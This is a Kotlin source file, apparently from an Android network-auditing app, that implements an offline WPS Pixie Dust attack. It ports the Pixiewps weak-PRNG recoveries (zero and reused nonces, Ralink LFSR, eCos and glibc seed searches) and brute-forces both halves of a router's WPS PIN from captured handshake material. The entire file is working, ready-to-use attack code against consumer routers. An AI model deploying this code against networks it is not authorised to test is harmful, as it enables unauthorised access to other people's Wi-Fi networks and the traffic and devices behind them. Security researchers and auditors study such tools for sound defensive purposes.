package com.swp81x.nrsuite.core.wps

import java.nio.charset.StandardCharsets
import java.util.Locale
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec

/**
 * Offline WPS Pixie Dust PIN search.
 *
 * Ports the Pixiewps PRNG families used by the Bruce/WIFITE reference:
 *   - E-S1 = E-S2 = zero
 *   - E-S1 = E-S2 = E-Nonce
 *   - Ralink LFSR reconstruction (RT/MT/CL)
 *   - eCos simplest
 *   - eCos simple 25-bit seed search
 *   - RTL/glibc date-window seed search, with an optional full 32-bit search
 *   - eCos Knuth full 32-bit search (optional, very expensive)
 *
 * The first matching mode wins. RTL and Knuth full searches are disabled by
 * default because they can take a very long time on a phone.
 */
object WpsPixieCracker {
    private const val PIN_HALF_RANGE = 10_000
    private const val SECOND_HALF_RANGE = 1_000
    private const val WPS_PSK_LENGTH = 16
    private const val RTL_QUICK_WINDOW_SECONDS = 86_400L
    private const val RTL_SECRET_DISTANCE = 600
    private const val RTL_SECOND_WINDOW = 10
    private const val ECOS_SIMPLE_COUNTER_LIMIT = 0x02000000L
    private const val UINT32_RANGE = 0x1_0000_0000L

    data class Progress(
        val phase: Phase,
        val tested: Long,
        val total: Long,
    ) {
        enum class Phase(val label: String) {
            ZERO_SECRET_NONCES("Zero secret nonces"),
            REUSED_PUBLIC_NONCE("Reused public nonce"),
            RALINK("Ralink LFSR reconstruction"),
            ECOS_SIMPLEST("eCos simplest"),
            ECOS_SIMPLE("eCos simple 25-bit seed search"),
            RTL_WINDOW("RTL/glibc date-window seed search"),
            RTL_FULL("RTL/glibc full seed search"),
            ECOS_KNUTH("eCos Knuth full seed search"),
            FIRST_HALF("First PIN half"),
            SECOND_HALF("Second PIN half"),
        }
    }

    /**
     * Attempts to recover the WPS PIN from captured registrar material.
     *
     * @param shouldStop polled frequently to support cancellation.
     * @param onProgress optional progress callback; called from the caller's thread.
     * @param epochSeconds approximate capture epoch for the RTL date-window search.
     * @param fullSearch enables the full 32-bit RTL and eCos Knuth searches.
     * @return the recovered PIN and generated secret nonces, or null if no
     *         implemented search finds a match.
     */
    fun crack(
        material: WpsPixieMaterial,
        shouldStop: () -> Boolean = { false },
        onProgress: (Progress) -> Unit = {},
        epochSeconds: Long = System.currentTimeMillis() / 1000L,
        fullSearch: Boolean = false,
    ): WpsPixieResult? {
        material.validate()
        val hmac = HmacSha256(material.authKey)

        crackWithSecretNonces(
            material = material,
            hmac = hmac,
            eS1 = ByteArray(WpsPixieMaterial.NONCE_LENGTH),
            eS2 = ByteArray(WpsPixieMaterial.NONCE_LENGTH),
            mode = WpsPixieMode.RT_MT_CL_ZERO_SECRET_NONCES,
            seedN1 = null,
            phase = Progress.Phase.ZERO_SECRET_NONCES,
            shouldStop = shouldStop,
            onProgress = onProgress,
        )?.let { return it }

        crackWithSecretNonces(
            material = material,
            hmac = hmac,
            eS1 = material.eNonce.copyOf(),
            eS2 = material.eNonce.copyOf(),
            mode = WpsPixieMode.RT_MT_CL_NONCE_SECRET_NONCES,
            seedN1 = null,
            phase = Progress.Phase.REUSED_PUBLIC_NONCE,
            shouldStop = shouldStop,
            onProgress = onProgress,
        )?.let { return it }

        recoverRalinkState(material.eNonce)?.let { recovered ->
            crackWithSecretNonces(
                material = material,
                hmac = hmac,
                eS1 = recovered.eS1,
                eS2 = recovered.eS2,
                mode = WpsPixieMode.RT_MT_CL,
                seedN1 = recovered.seed,
                phase = Progress.Phase.RALINK,
                shouldStop = shouldStop,
                onProgress = onProgress,
            )?.let { return it }
        }

        crackEcosSimplest(
            material = material,
            hmac = hmac,
            shouldStop = shouldStop,
            onProgress = onProgress,
        )?.let { return it }

        crackEcosSimple(
            material = material,
            hmac = hmac,
            shouldStop = shouldStop,
            onProgress = onProgress,
        )?.let { return it }

        crackRtl(
            material = material,
            hmac = hmac,
            epochSeconds = epochSeconds,
            fullSearch = fullSearch,
            shouldStop = shouldStop,
            onProgress = onProgress,
        )?.let { return it }

        if (fullSearch) {
            crackEcosKnuth(
                material = material,
                hmac = hmac,
                shouldStop = shouldStop,
                onProgress = onProgress,
            )?.let { return it }
        }

        return null
    }

    fun wpsPinChecksum(pin: Int): Int {
        var value = pin
        var accumulator = 0
        while (value != 0) {
            accumulator += 3 * (value % 10)
            value /= 10
            accumulator += value % 10
            value /= 10
        }
        return (10 - accumulator % 10) % 10
    }

    fun wpsPinIsValid(pin: Int): Boolean =
        pin in 0..99_999_999 && wpsPinChecksum(pin / 10) == pin % 10

    private data class PinHalf(
        val pin: String,
        val psk: ByteArray,
    )

    private fun crackWithSecretNonces(
        material: WpsPixieMaterial,
        hmac: HmacSha256,
        eS1: ByteArray,
        eS2: ByteArray,
        mode: WpsPixieMode,
        seedN1: UInt?,
        phase: Progress.Phase,
        shouldStop: () -> Boolean,
        onProgress: (Progress) -> Unit,
    ): WpsPixieResult? {
        val firstHalf = crackFirstPinHalf(
            material = material,
            hmac = hmac,
            eS1 = eS1,
            phase = phase,
            shouldStop = shouldStop,
            onProgress = onProgress,
        ) ?: return null

        val secondHalf = crackSecondPinHalf(
            material = material,
            hmac = hmac,
            eS2 = eS2,
            firstHalf = firstHalf.pin,
            phase = phase,
            shouldStop = shouldStop,
            onProgress = onProgress,
        ) ?: return null

        return WpsPixieResult(
            pin = firstHalf.pin + secondHalf.pin,
            mode = mode,
            psk1 = firstHalf.psk,
            psk2 = secondHalf.psk,
            eS1 = eS1.copyOf(),
            eS2 = eS2.copyOf(),
            seedN1 = seedN1,
        )
    }

    private fun crackEcosSimplest(
        material: WpsPixieMaterial,
        hmac: HmacSha256,
        shouldStop: () -> Boolean,
        onProgress: (Progress) -> Unit,
    ): WpsPixieResult? {
        val phase = Progress.Phase.ECOS_SIMPLEST
        for (lowerByte in 0 until 256) {
            if (shouldStop()) return null
            val state = UIntState(lowerByte.toUInt())
            val nonce = ByteArray(WpsPixieMaterial.NONCE_LENGTH) {
                ecosRandSimplest(state).toByte()
            }
            if (!nonce.contentEquals(material.eNonce)) continue
            val eS1 = ByteArray(WpsPixieMaterial.NONCE_LENGTH) {
                ecosRandSimplest(state).toByte()
            }
            val eS2 = ByteArray(WpsPixieMaterial.NONCE_LENGTH) {
                ecosRandSimplest(state).toByte()
            }
            return crackWithSecretNonces(
                material = material,
                hmac = hmac,
                eS1 = eS1,
                eS2 = eS2,
                mode = WpsPixieMode.ECOS_SIMPLEST,
                seedN1 = lowerByte.toUInt(),
                phase = phase,
                shouldStop = shouldStop,
                onProgress = onProgress,
            )
        }
        onProgress(Progress(phase, 256, 256))
        return null
    }

    private fun crackEcosSimple(
        material: WpsPixieMaterial,
        hmac: HmacSha256,
        shouldStop: () -> Boolean,
        onProgress: (Progress) -> Unit,
    ): WpsPixieResult? {
        val phase = Progress.Phase.ECOS_SIMPLE
        val known = (material.eNonce[0].toInt() and 0xff).toUInt() shl 25
        var counter = 0L
        while (counter < ECOS_SIMPLE_COUNTER_LIMIT) {
            if ((counter and 4095L) == 0L) {
                if (shouldStop()) return null
                onProgress(Progress(phase, counter, ECOS_SIMPLE_COUNTER_LIMIT))
            }
            val state = UIntState(known or counter.toUInt())
            var matches = true
            for (index in 1 until WpsPixieMaterial.NONCE_LENGTH) {
                if (ecosRandSimple(state).toByte() != material.eNonce[index]) {
                    matches = false
                    break
                }
            }
            if (matches) {
                val eS1 = ByteArray(WpsPixieMaterial.NONCE_LENGTH) {
                    ecosRandSimple(state).toByte()
                }
                val eS2 = ByteArray(WpsPixieMaterial.NONCE_LENGTH) {
                    ecosRandSimple(state).toByte()
                }
                return crackWithSecretNonces(
                    material = material,
                    hmac = hmac,
                    eS1 = eS1,
                    eS2 = eS2,
                    mode = WpsPixieMode.ECOS_SIMPLE,
                    seedN1 = known or counter.toUInt(),
                    phase = phase,
                    shouldStop = shouldStop,
                    onProgress = onProgress,
                )
            }
            counter++
        }
        onProgress(Progress(phase, ECOS_SIMPLE_COUNTER_LIMIT, ECOS_SIMPLE_COUNTER_LIMIT))
        return null
    }

    private fun crackRtl(
        material: WpsPixieMaterial,
        hmac: HmacSha256,
        epochSeconds: Long,
        fullSearch: Boolean,
        shouldStop: () -> Boolean,
        onProgress: (Progress) -> Unit,
    ): WpsPixieResult? {
        if ((material.eNonce[0].toInt() and 0x80) != 0 ||
            (material.eNonce[4].toInt() and 0x80) != 0 ||
            (material.eNonce[8].toInt() and 0x80) != 0 ||
            (material.eNonce[12].toInt() and 0x80) != 0
        ) {
            return null
        }

        val phase = if (fullSearch) Progress.Phase.RTL_FULL else Progress.Phase.RTL_WINDOW
        val high: Long
        val low: Long
        if (fullSearch) {
            high = 0xffff_ffffL
            low = 0L
        } else {
            high = (epochSeconds + RTL_QUICK_WINDOW_SECONDS).coerceAtMost(0xffff_ffffL)
            low = (epochSeconds - RTL_QUICK_WINDOW_SECONDS).coerceAtLeast(0L)
        }
        val total = high - low + 1L
        val nonceWord = readBe32(material.eNonce, 0)
        var done = 0L
        while (done < total) {
            if ((done and 4095L) == 0L) {
                if (shouldStop()) return null
                onProgress(Progress(phase, done, total))
            }
            val seed = (high - done).toUInt()
            if (glibcFastSeed(seed) == nonceWord) {
                val nonce = glibcNonceBytes(seed)
                if (nonce.contentEquals(material.eNonce)) {
                    crackRtlSecrets(
                        material = material,
                        hmac = hmac,
                        seed = seed,
                        phase = phase,
                        shouldStop = shouldStop,
                        onProgress = onProgress,
                    )?.let { return it }
                }
            }
            done++
        }
        return null
    }

    private fun crackRtlSecrets(
        material: WpsPixieMaterial,
        hmac: HmacSha256,
        seed: UInt,
        phase: Progress.Phase,
        shouldStop: () -> Boolean,
        onProgress: (Progress) -> Unit,
    ): WpsPixieResult? {
        for (distance in 0..RTL_SECRET_DISTANCE) {
            val signs = if (distance == 0) 1 else 2
            for (sign in 0 until signs) {
                if (shouldStop()) return null
                val candidate = when {
                    sign == 0 -> seed + distance.toUInt()
                    seed >= distance.toUInt() -> seed - distance.toUInt()
                    else -> continue
                }
                val eS1 = glibcNonceBytes(candidate)
                val firstHalf = crackFirstPinHalf(
                    material = material,
                    hmac = hmac,
                    eS1 = eS1,
                    phase = phase,
                    shouldStop = shouldStop,
                    onProgress = onProgress,
                ) ?: continue
                for (offset in 0 until RTL_SECOND_WINDOW) {
                    if (shouldStop()) return null
                    val secondSeed = candidate + offset.toUInt()
                    val eS2 = glibcNonceBytes(secondSeed)
                    val secondHalf = crackSecondPinHalf(
                        material = material,
                        hmac = hmac,
                        eS2 = eS2,
                        firstHalf = firstHalf.pin,
                        phase = phase,
                        shouldStop = shouldStop,
                        onProgress = onProgress,
                    ) ?: continue
                    return WpsPixieResult(
                        pin = firstHalf.pin + secondHalf.pin,
                        mode = WpsPixieMode.RTL,
                        psk1 = firstHalf.psk,
                        psk2 = secondHalf.psk,
                        eS1 = eS1,
                        eS2 = eS2,
                        seedN1 = candidate,
                    )
                }
            }
        }
        return null
    }

    private fun crackEcosKnuth(
        material: WpsPixieMaterial,
        hmac: HmacSha256,
        shouldStop: () -> Boolean,
        onProgress: (Progress) -> Unit,
    ): WpsPixieResult? {
        val phase = Progress.Phase.ECOS_KNUTH
        var index = 0L
        while (index < UINT32_RANGE) {
            if ((index and 4095L) == 0L) {
                if (shouldStop()) return null
                onProgress(Progress(phase, index, UINT32_RANGE))
            }
            val seed = index.toUInt()
            val state = UIntState(seed)
            var matches = true
            for (nonceIndex in 0 until WpsPixieMaterial.NONCE_LENGTH) {
                if (ecosRandKnuth(state).toByte() != material.eNonce[nonceIndex]) {
                    matches = false
                    break
                }
            }
            if (matches) {
                val eS1 = ByteArray(WpsPixieMaterial.NONCE_LENGTH) {
                    ecosRandKnuth(state).toByte()
                }
                val eS2 = ByteArray(WpsPixieMaterial.NONCE_LENGTH) {
                    ecosRandKnuth(state).toByte()
                }
                return crackWithSecretNonces(
                    material = material,
                    hmac = hmac,
                    eS1 = eS1,
                    eS2 = eS2,
                    mode = WpsPixieMode.ECOS_KNUTH,
                    seedN1 = seed,
                    phase = phase,
                    shouldStop = shouldStop,
                    onProgress = onProgress,
                )
            }
            index++
        }
        return null
    }

    private fun crackFirstPinHalf(
        material: WpsPixieMaterial,
        hmac: HmacSha256,
        eS1: ByteArray,
        phase: Progress.Phase,
        shouldStop: () -> Boolean,
        onProgress: (Progress) -> Unit,
    ): PinHalf? {
        checkEmptyPinHalf(material, hmac, eS1, material.eHash1)?.let { emptyPsk ->
            return PinHalf(pin = "", psk = emptyPsk)
        }

        for (candidate in 0 until PIN_HALF_RANGE) {
            if (shouldStop()) return null
            val pin = String.format(Locale.US, "%04d", candidate)
            val psk = checkPinHalf(
                material,
                hmac,
                pin.toByteArray(StandardCharsets.US_ASCII),
                eS1,
                material.eHash1,
            )
            if (psk != null) {
                return PinHalf(pin = pin, psk = psk)
            }
            if (candidate % 250 == 0) {
                onProgress(Progress(Progress.Phase.FIRST_HALF, candidate.toLong(), PIN_HALF_RANGE.toLong()))
            }
        }
        return null
    }

    private fun crackSecondPinHalf(
        material: WpsPixieMaterial,
        hmac: HmacSha256,
        eS2: ByteArray,
        firstHalf: String,
        phase: Progress.Phase,
        shouldStop: () -> Boolean,
        onProgress: (Progress) -> Unit,
    ): PinHalf? {
        val firstHalfValue = if (firstHalf.isEmpty()) 0 else firstHalf.toInt()

        if (firstHalf.isEmpty()) {
            checkEmptyPinHalf(material, hmac, eS2, material.eHash2)?.let { emptyPsk ->
                return PinHalf(pin = "", psk = emptyPsk)
            }
        }

        for (secondHalf in 0 until SECOND_HALF_RANGE) {
            if (shouldStop()) return null
            val checksum = wpsPinChecksum(firstHalfValue * 1_000 + secondHalf)
            val candidate = secondHalf * 10 + checksum
            val pin = String.format(Locale.US, "%04d", candidate)
            val psk = checkPinHalf(
                material,
                hmac,
                pin.toByteArray(StandardCharsets.US_ASCII),
                eS2,
                material.eHash2,
            )
            if (psk != null) {
                return PinHalf(pin = pin, psk = psk)
            }
            if (secondHalf % 100 == 0) {
                onProgress(Progress(Progress.Phase.SECOND_HALF, secondHalf.toLong(), SECOND_HALF_RANGE.toLong()))
            }
        }

        // Preserve the pixiewps fallback for vendor PINs that ignore the
        // standard checksum relationship in the second half.
        for (secondHalf in 0 until PIN_HALF_RANGE) {
            if (shouldStop()) return null
            if (wpsPinIsValid(firstHalfValue * 10_000 + secondHalf)) {
                continue
            }
            val pin = String.format(Locale.US, "%04d", secondHalf)
            val psk = checkPinHalf(
                material,
                hmac,
                pin.toByteArray(StandardCharsets.US_ASCII),
                eS2,
                material.eHash2,
            )
            if (psk != null) {
                return PinHalf(pin = pin, psk = psk)
            }
        }
        return null
    }

    private fun checkEmptyPinHalf(
        material: WpsPixieMaterial,
        hmac: HmacSha256,
        eS: ByteArray,
        expectedHash: ByteArray,
    ): ByteArray? {
        val emptyPsk = hmac.digest(ByteArray(0)).copyOfRange(0, WPS_PSK_LENGTH)
        val input = concat(eS, emptyPsk, material.pke, material.pkr)
        val digest = hmac.digest(input)
        return if (constantTimeEquals(digest, expectedHash)) emptyPsk else null
    }

    private fun checkPinHalf(
        material: WpsPixieMaterial,
        hmac: HmacSha256,
        pinHalf: ByteArray,
        eS: ByteArray,
        expectedHash: ByteArray,
    ): ByteArray? {
        require(pinHalf.size == 4) { "PIN half must be 4 bytes" }
        val psk = hmac.digest(pinHalf).copyOfRange(0, WPS_PSK_LENGTH)
        val input = concat(eS, psk, material.pke, material.pkr)
        val digest = hmac.digest(input)
        return if (constantTimeEquals(digest, expectedHash)) psk else null
    }

    private fun recoverRalinkState(eNonce: ByteArray): RalinkState? {
        val prng = RalinkPrng(0u)
        for (index in eNonce.indices.reversed()) {
            prng.restoreByte(eNonce[index].toInt() and 0xff)
        }
        val saved = prng.sreg
        for (index in eNonce.indices) {
            if (prng.nextByte() != (eNonce[index].toInt() and 0xff)) {
                return null
            }
        }

        prng.sreg = saved
        val seedN1 = saved
        val eS2 = ByteArray(WpsPixieMaterial.NONCE_LENGTH)
        for (index in eS2.indices.reversed()) {
            eS2[index] = prng.previousByte().toByte()
        }
        val eS1 = ByteArray(WpsPixieMaterial.NONCE_LENGTH)
        for (index in eS1.indices.reversed()) {
            eS1[index] = prng.previousByte().toByte()
        }
        return RalinkState(seed = seedN1, eS1 = eS1, eS2 = eS2)
    }

    private data class RalinkState(
        val seed: UInt,
        val eS1: ByteArray,
        val eS2: ByteArray,
    )

    private class RalinkPrng(var sreg: UInt) {
        fun nextByte(): Int {
            var resultByte = 0
            repeat(8) {
                val bit: Int
                if ((sreg and 1u) != 0u) {
                    sreg = ((sreg xor 0x80000057u) shr 1) or 0x80000000u
                    bit = 1
                } else {
                    sreg = sreg shr 1
                    bit = 0
                }
                resultByte = (resultByte shl 1) or bit
            }
            return resultByte and 0xff
        }

        fun previousByte(): Int {
            var resultByte = 0
            repeat(8) { index ->
                val bit: Int
                if ((sreg and 0x80000000u) != 0u) {
                    sreg = ((sreg shl 1) xor 0x80000057u) or 1u
                    bit = 1
                } else {
                    sreg = sreg shl 1
                    bit = 0
                }
                resultByte = resultByte or (bit shl index)
            }
            return resultByte and 0xff
        }

        fun restoreByte(value: Int) {
            var remaining = value
            repeat(8) {
                val bit = remaining and 1
                remaining = remaining ushr 1
                sreg = if (bit != 0) {
                    ((sreg shl 1) xor 0x80000057u) or 1u
                } else {
                    sreg shl 1
                }
            }
        }
    }

    private class UIntState(var value: UInt)

    private fun ecosRandSimplest(state: UIntState): UInt {
        state.value = state.value * 1_103_515_245u + 12_345u
        return state.value
    }

    private fun ecosRandSimple(state: UIntState): UInt {
        var seed = state.value
        seed = seed * 1_103_515_245u + 12_345u
        var result = seed and 0xffe00000u
        seed = seed * 1_103_515_245u + 12_345u
        result += (seed and 0xfffc0000u) shr 11
        seed = seed * 1_103_515_245u + 12_345u
        result += (seed and 0xfe000000u) shr 25
        state.value = seed
        return result
    }

    private fun ecosRandKnuth(state: UIntState): UInt {
        var seed = state.value.toLong()
        seed = 48_271L * (seed % 44_488L) - 3_399L * (seed / 44_488L)
        if (seed and 0x8000_0000L != 0L) seed += 2_147_483_647L
        state.value = seed.toUInt()
        return state.value
    }

    private fun readBe32(bytes: ByteArray, offset: Int): UInt =
        ((bytes[offset].toUInt() and 0xffu) shl 24) or
            ((bytes[offset + 1].toUInt() and 0xffu) shl 16) or
            ((bytes[offset + 2].toUInt() and 0xffu) shl 8) or
            (bytes[offset + 3].toUInt() and 0xffu)

    private fun glibcNonceBytes(seed: UInt): ByteArray {
        val words = glibcFastNonce(seed)
        val output = ByteArray(16)
        for (index in 0 until 4) {
            val word = words[index]
            output[index * 4] = (word shr 24).toByte()
            output[index * 4 + 1] = (word shr 16).toByte()
            output[index * 4 + 2] = (word shr 8).toByte()
            output[index * 4 + 3] = word.toByte()
        }
        return output
    }

    private fun normalizeGlibcSeed(input: UInt): UInt = when (input) {
        0x7fff_ffffu -> 0x13f8_35f3u
        0xffff_fffeu -> 0x5df7_35f1u
        else -> input
    }

    private fun glibcFastNonce(input: UInt): UIntArray {
        var seed = normalizeGlibcSeed(input)
        var word0 = 0u
        var word1 = 0u
        var word2 = 0u
        var word3 = 0u
        for (index in 0 until 31) {
            word0 += seed * GLIBC_SEED_TABLE[index + 3]
            word1 += seed * GLIBC_SEED_TABLE[index + 2]
            word2 += seed * GLIBC_SEED_TABLE[index + 1]
            word3 += seed * GLIBC_SEED_TABLE[index]
            var product = 16_807uL * seed.toULong()
            product = (product shr 31) + (product and 0x7fff_ffffuL)
            product = (product shr 31) + (product and 0x7fff_ffffuL)
            seed = product.toUInt()
        }
        return uintArrayOf(word0 shr 1, word1 shr 1, word2 shr 1, word3 shr 1)
    }

    private fun glibcFastSeed(input: UInt): UInt {
        var seed = normalizeGlibcSeed(input)
        var word0 = 0u
        for (index in 3 until GLIBC_SEED_TABLE.size - 1) {
            word0 += seed * GLIBC_SEED_TABLE[index]
            var product = 16_807uL * seed.toULong()
            product = (product shr 31) + (product and 0x7fff_ffffuL)
            product = (product shr 31) + (product and 0x7fff_ffffuL)
            seed = product.toUInt()
        }
        return (word0 + seed * GLIBC_SEED_TABLE[33]) shr 1
    }

    private class HmacSha256(key: ByteArray) {
        private val mac = Mac.getInstance("HmacSHA256").apply {
            init(SecretKeySpec(key, "HmacSHA256"))
        }

        fun digest(data: ByteArray): ByteArray {
            mac.reset()
            return mac.doFinal(data)
        }
    }

    private fun concat(vararg parts: ByteArray): ByteArray {
        val output = ByteArray(parts.sumOf { it.size })
        var offset = 0
        for (part in parts) {
            part.copyInto(output, offset)
            offset += part.size
        }
        return output
    }

    private fun constantTimeEquals(left: ByteArray, right: ByteArray): Boolean {
        if (left.size != right.size) return false
        var difference = 0
        for (index in left.indices) {
            difference = difference or (left[index].toInt() xor right[index].toInt())
        }
        return difference == 0
    }

    private val GLIBC_SEED_TABLE = uintArrayOf(
        0x0128e83bu, 0x00dafa31u, 0x009f4828u, 0x00f66443u, 0x00bee24du,
        0x00817005u, 0x00cb918fu, 0x00a64845u, 0x0069c3cfu, 0x00a76dbdu,
        0x0090a848u, 0x0057025fu, 0x0089126cu, 0x007d9a8fu, 0x0048252au,
        0x006fb2d4u, 0x006ccc15u, 0x003c5744u, 0x005a998fu, 0x005df917u,
        0x0032ed77u, 0x00492688u, 0x0050e901u, 0x002b5f57u, 0x003acd0bu,
        0x00456b7au, 0x0025413du, 0x002f11f4u, 0x003b564du, 0x00203f14u,
        0x002589fcu, 0x003283f8u, 0x001c17e4u, 0x001dd823u,
    )
}
